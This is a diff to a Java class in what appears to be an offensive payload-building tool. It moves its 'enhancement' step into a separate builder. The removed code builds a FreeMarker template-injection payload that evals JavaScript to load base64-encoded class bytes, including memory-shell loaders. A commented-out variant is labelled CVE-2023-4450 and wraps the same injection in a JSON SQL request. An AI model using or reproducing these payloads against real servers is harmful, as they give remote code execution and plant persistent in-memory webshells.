@@ -1,8 +1,7 @@
 package com.ppp;
 
-import com.ppp.annotation.JavaClassEnhance;
 import com.ppp.annotation.JavaClassHelperType;
-import com.ppp.utils.PayloadUtils;
+import com.ppp.annotation.JavaClassMakerEnhance;
 import com.ppp.utils.Reflections;
 import com.ppp.utils.maker.ClassUtils;
 import com.ppp.utils.maker.CryptoUtils;
@@ -22,8 +21,10 @@ public class JavaClassBuilder {
     public static byte[] build(JavaClassHelper javaClassHelper) throws Exception {
         String javaClassHelperType = javaClassHelper.getJavaClassHelperType();
         String javaClassFilePath = javaClassHelper.getJavaClassFilePath();
-        byte[] bytes = new byte[0];
 
+        JavaClassAdvanceBuilder.builder(javaClassHelper);
+
+        byte[] bytes = new byte[0];
         if (javaClassHelperType.equals(JavaClassHelperType.Custom)) {
             try {
                 Printer.yellowInfo("load JavaClass from file: " + javaClassFilePath);
@@ -56,39 +57,11 @@ public class JavaClassBuilder {
             bytes = (byte[]) Reflections.invokeMethod(builderClass.newInstance(), "build", javaClassHelper);
         }
 
-        advance(javaClassHelper, bytes);
+        /**
+         * 输出增强
+         */
+        JavaClassAdvanceBuilder.result(javaClassHelper, bytes);
         return bytes;
-
     }
-
-    /**
-     * 增强
-     */
-    public static void advance(JavaClassHelper javaClassHelper, byte[] bytes) throws Exception {
-        JavaClassEnhance javaClassEnhance = javaClassHelper.getJavaClassEnhance();
-        switch (javaClassEnhance) {
-            case Default:
-            default:
-                break;
-            case FreeMarker:
-                String codeClassName = null;
-                // 内存马
-                if (javaClassHelper.getJavaClassHelperType().equals(JavaClassHelperType.MemShell)) {
-                    codeClassName = javaClassHelper.getLoaderClassName();
-                } else {
-                    codeClassName = javaClassHelper.getCLASSNAME();
-                }
-
-                // todo
-                String freeMakerPayload = String.format("{\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval('%s')}", PayloadUtils.loadByScriptEngine(CryptoUtils.base64encoder(bytes), codeClassName));
-
-                // CVE-2023-4450
-//                String codec = PayloadUtils.loadByScriptEngine(CryptoUtils.base64encoder(bytes), codeClassName).replaceAll("\"", "\\\\\"");
-//                String freeMakerPayload = String.format("{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval('%s#{1};')}\",\"dbSource\":\"\",\"type\":\"0\"}", codec);
-
-                Printer.print(freeMakerPayload);
-        }
-    }
-
 
 }
